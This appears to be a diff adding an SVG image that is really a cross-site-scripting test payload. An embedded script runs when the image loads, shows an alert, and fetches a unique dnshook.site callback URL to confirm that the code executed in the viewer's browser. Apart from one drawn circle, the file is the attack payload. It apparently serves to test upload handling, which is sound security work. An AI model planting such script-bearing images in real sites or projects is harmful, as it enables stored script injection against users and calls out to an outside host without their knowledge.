@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+
+    <script type="text/javascript">
+        <![CDATA[
+            console.log("SVG script executed");
+            fetch("https://2307d426-85f2-478a-a320-e0e6e6449782.dnshook.site")
+              .then(r => console.log("sent"))
+              .catch(e => console.log(e));
+            document.addEventListener("DOMContentLoaded", () => {
+                console.log("DOM loaded from SVG");
+            });
+
+            alert("SVG Loaded");
+        ]]>
+      
+    </script>
+
+    <circle cx="100" cy="100" r="80" fill="red"/>
+</svg>
